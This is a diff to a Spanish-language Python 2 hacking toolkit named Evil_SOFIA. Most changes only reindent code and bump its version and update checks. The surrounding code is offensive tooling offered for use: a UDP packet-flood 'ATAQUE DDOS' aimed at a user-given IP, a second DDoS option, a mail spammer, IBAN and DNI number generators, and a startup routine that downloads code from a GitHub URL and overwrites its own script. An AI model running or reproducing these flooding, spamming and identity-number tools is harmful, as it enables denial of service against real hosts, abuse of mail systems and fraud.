@@ -12,21 +12,21 @@ def cls():
     os.system([linux, windows][os.name == 'nt'])
 
 
-vrs = ('mOS VERSION\n')
+vrs = ('mOS VERSION - 04920\n')
 time.sleep(0.5)
 
 try:
- import requests
+    import requests
 except:
-  print(" Installing requests Module")
-  if os.name=='nt':
-    try:
-      os.system('C:\Python27\Scripts\pip2.exe install requests')
-    except:
-      print ("Install Python-Pip Sir")
-      raw_input('')
-  else:
-    os.system('pip2 install requests')
+    print(" Installing requests Module")
+    if os.name=='nt':
+        try:
+            os.system('C:\Python27\Scripts\pip2.exe install requests')
+        except:
+            print ("Install Python-Pip Sir")
+            raw_input('')
+    else:
+        os.system('pip2 install requests')
 msg001 = ("""
                                      _       
                                     | |      
@@ -50,28 +50,28 @@ skri = onde.json()
 esono = skri['vpn_or_proxy']
 
 if esono=="no":
-  pass
+    pass
 elif esono=="yes":
-  print("[PROXY DETECTED]")
+    print("[PROXY DETECTED]")
 else:
-  print("error")
+    print("error")
 
 print(msg001)
 msg00 = "OOO\n"
 for i in msg00:
-        sys.stdout.write(i)
-        sys.stdout.flush()
-        time.sleep(0.2)
+    sys.stdout.write(i)
+    sys.stdout.flush()
+    time.sleep(0.2)
 
 vers=requests.get('https://pastebin.com/raw/0pqX38U3').text.encode('utf-8')
 
-if vers=="6.2.5":
+if vers=="6.1.5":
     pass
 else:
-  codigonuevo = requests.get("https://raw.githubusercontent.com/emiliobog/Evil-Sofia/master/Sofia.py").text
-  f = open("Sofia.py", "wb")
-  f.write(codigonuevo)
-  print("UPDATE SUCCESSFULLY")
+    codigonuevo = requests.get("https://raw.githubusercontent.com/emiliobog/Evil-Sofia/master/Sofia.py").text
+    f = open("Sofia.py", "wb")
+    f.write(codigonuevo)
+    print("UPDATE SUCCESSFULLY")
 
 ax = os.system
 cls()
@@ -105,7 +105,7 @@ time.sleep(1.4)
 print ("         Emmanuel Milos" + "|" + "Emilio Barroso")
 print ("              ~MULTI-HERRAMIENTA~")
 print ('''
-  
+
 ''')
 
 while True:
@@ -115,7 +115,7 @@ while True:
     print("   3.ATAQUE DDOS")
     print("   4.IBAN GEN/CHECK")
     print("   5.ENCRIPTADOR")
-    print("   6.EXTRAPOLADOR V2 [BETA]")
+    print("   6.EXTRAPOLADOR V2 [NEW]")
     print("   7.MAIL SPAMMER")
     print("   8.HOST TO IP")
     print("   9.STEAD - DDOS")
@@ -181,14 +181,14 @@ while True:
     elif opc==2:
         #LAST DNI GEN
         import time
-        
+
         from random import randint
-        
+
         cls()
-        
+
         print time.strftime("               %I:%M:%S")
         print('''
-    
+
 $$\        $$$$$$+   $$$$$$\ $$$$$$$$\ 
 $$ |      $$  __$$\ $$  __$$\\__$$  __|
 $$ |      $$ /  $$ |$$ /  \__|  $$ |   
@@ -197,8 +197,8 @@ $$ |      $$  __$$ | \____$$\   $$ |
 $$ |      $$ |  $$ |$$\   $$ |  $$ |   
 $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |   
 \________|\__|  \__| \______/   \__|   
-                                       
-                                                                 
+
+
             ''')
         dni=range(1,9)
         print("   Emmanuel Milos|Emilio Barroso")
@@ -207,11 +207,11 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
 
         while i<len(dni):
             for elento in dni:
-               dni[i]=randint(1,9)
+                dni[i]=randint(1,9)
             i+=1
 
 
-    
+
         dni2=x=''.join(map(str,dni))
 
         print ' '
@@ -238,7 +238,7 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         ra()
 
         raw_input("Presiona Enter Para Salir De El Gen")
-        
+
     elif opc==3: 
         import socket
         import random
@@ -260,14 +260,14 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
  _  _  _  __    _ ______ _  __   
 | \| \/ \(_    |_| |  | |_|/  |/ 
 |_/|_/\_/__)   | | |  | | |\__|\ 
-                                                              
+
         ''')
         ip = raw_input("IP Target : ")
         port = input("Port       : ")
 
         cls()
         os.system("echo INICIANDO ATAQUE! ")
-        
+
         limonja= ("[====================] 100%")
         for i in limonja:
             sys.stdout.write(i)
@@ -276,11 +276,11 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         time.sleep(2)
         sent=0
         while True:
-             sock.sendto(bytes, (ip,port))
-             sent = sent + 1
-             port = port + 1
-             print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
-             if port == 65534:
+            sock.sendto(bytes, (ip,port))
+            sent = sent + 1
+            port = port + 1
+            print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
+            if port == 65534:
                 port = 1
                 break;
     elif opc==4:
@@ -383,7 +383,7 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         print ('      <<_MENU_>>')
         print("")
         print ('11 - ENCRIPTADOR DE PALABRAS')
-        time.sleep(5)
+        time.sleep(2)
 
         othert = int(input("DIGITE LA OPCION: "))
         if othert == 11:
@@ -396,40 +396,40 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
             rpas =len(abc) 
 
             def invertir(var):
-                    return var[::-1]
- 
+                return var[::-1]
+
 #funcion de resta
             def restar(x,y):
-                    if x>y:
-                        return x-y
-                    else:
-                        return y-x
- 
+                if x>y:
+                    return x-y
+                else:
+                    return y-x
+
             #funcion para eliminar los espacios
             def sin(txt):
-                    nuevo=""
-                    for x in txt:
-                            if x=='|':
-                                nuevo = nuevo+' '
-                            else:
-                                nuevo = nuevo+x
-                    return nuevo
- 
+                nuevo=""
+                for x in txt:
+                    if x=='|':
+                        nuevo = nuevo+' '
+                    else:
+                        nuevo = nuevo+x
+                return nuevo
+
             def espacio(texto):
-                    espacios= ""
-                    for x in texto:
-                            if x==' ':
-                                espacios = espacios+'|'
-                            else:
-                                espacios = espacios+x.lower() #convertimos a minusculas 
-                    return espacios
- 
- #opcion de encriptacion
+                espacios= ""
+                for x in texto:
+                    if x==' ':
+                        espacios = espacios+'|'
+                    else:
+                        espacios = espacios+x.lower() #convertimos a minusculas 
+                return espacios
+
+    #opcion de encriptacion
             if opcion == 1:
                 print"opcion de encriptacion"
                 mensaje=""
                 clave =""
- 
+
                 mensaje = raw_input("introduzca mensaje a ecriptar: ")
                 clave = raw_input("introduzca palabra clave: ")
                 n =   len(mensaje)  #cuento la cantidad de caracteres 
@@ -440,26 +440,26 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
                 suma = 0
                 espacios=""
                 espacios=espacio(mensaje)
- 
+
                 for x in espacios:
                     for y in range(rpas):
                         li = 0
                         if x==abc[y]:
-                                li=y+index
-                                if li <= rpas:
-                                    encoding =encoding+abc[li]
- 
-                                else:
-                                    suma= restar(rpas,li)
-                                    encoding =encoding+abc[suma]+'$'
-                                    suma = 0
+                            li=y+index
+                            if li <= rpas:
+                                encoding =encoding+abc[li]
+
+                            else:
+                                suma= restar(rpas,li)
+                                encoding =encoding+abc[suma]+'$'
+                                suma = 0
     #print encoding
                 print "mensaje cifrado: ",invertir(encoding)
                 print "su clave es:", clave
                 time.sleep(10)
                 cls()
             if opcion == 2:
- 
+
                 print"opcion de desencriptacion"
                 mensaje=""
                 mensaje= ''
@@ -467,39 +467,39 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
                 clave = raw_input("Introduzca clave: ")
                 ab=clave[0] #seleccionamos la letra de la posicion 0 
                 index = abc.index(ab)  #usamos nuestra letra la ver en donde cae en la lista de abc
- 
+
                 contador = 0
                 decoding= ''
                 letra= ''
                 tx= ''
                 suma = 0
                 rango =   len(mensaje) #cuento la cantidad de caracteres
- 
+
                 w=0
                 while w < rango:
-                        letra=mensaje[w]
-                        if letra =='$':    
-                                incr = w+1
-                                li = 0
-                                tx=mensaje[incr]
-                                posicion= w
-                                for y in range(rpas):
-                                    if tx == abc[y]:
-                                        li=restar(index,y)
-                            #print index, " - ", y,"=",li
-                                        suma=restar(rpas,li)
-                                    decoding =decoding+abc[suma]
-                                    w+=1
-                        else:
-                                li = 0
-                                tx=mensaje[w]
-                                posicion= w
-                                for s in range(rpas):
-                                    if tx == abc[s]:
-                                        li= restar(s,index)
-                                        decoding =decoding+abc[li]
-                            #print posicion
-                        w+=1
+                    letra=mensaje[w]
+                    if letra =='$':    
+                        incr = w+1
+                        li = 0
+                        tx=mensaje[incr]
+                        posicion= w
+                        for y in range(rpas):
+                            if tx == abc[y]:
+                                li=restar(index,y)
+                    #print index, " - ", y,"=",li
+                                suma=restar(rpas,li)
+                            decoding =decoding+abc[suma]
+                            w+=1
+                    else:
+                        li = 0
+                        tx=mensaje[w]
+                        posicion= w
+                        for s in range(rpas):
+                            if tx == abc[s]:
+                                li= restar(s,index)
+                                decoding =decoding+abc[li]
+                        #print posicion
+                    w+=1
                 #print decoding
                 mensaje =invertir(decoding)
                 #print mensaje
@@ -558,8 +558,8 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         import random
         import os, sys, smtplib, getpass
         def logo():
-                cls()
-                print '''
+            cls()
+            print '''
              o
              X
              X
@@ -697,7 +697,7 @@ SSSS    TT   EEEE A  A DDD'''
                 print('EL SERVER TIENE PROTECCION CONTRA ESTE DDOS') 
             else:
                 print("PAQUETE ENVIADO CORRECTAMENTE")
-               
+
                 print(botella)
                 function()
         function()
@@ -790,31 +790,31 @@ Proxy Checker [IP:PORT]
         print(poseidon)
 
         while True:
-          propsi = raw_input("Proxy: ")
-          try:
-              hostname = propsi.split(':')[0]
-              porto = propsi.split(':')[1]
-              socket.gethostbyaddr(hostname)
-              isla+=1
-              if saca==2:
+            propsi = raw_input("Proxy: ")
+            try:
+                hostname = propsi.split(':')[0]
+                porto = propsi.split(':')[1]
+                socket.gethostbyaddr(hostname)
+                isla+=1
+                if saca==2:
+                    break;
+                else:
+                    pass
+            except socket.herror:
+                print ("[X] [Proxy Die] => " + hostname + ":" + porto)
+                isla+=2
                 break;
-              else:
-                pass
-          except socket.herror:
-              print ("[X] [Proxy Die] => " + hostname + ":" + porto)
-              isla+=2
-              break;
         if isla==1:
-          print("[+] [Proxy Live] => " + hostname + ":" + porto)
-          saca+=2
+            print("[+] [Proxy Live] => " + hostname + ":" + porto)
+            saca+=2
 
 
-        
+
     elif opc==99:
         pris = "Gracias Por Utlizar Evil_SOFIA.  VERSION:" + vrs 
         for i in pris:
-         sys.stdout.write(i)
-         sys.stdout.flush()
-         time.sleep(0.02)
+            sys.stdout.write(i)
+            sys.stdout.flush()
+            time.sleep(0.02)
         break
         exit()
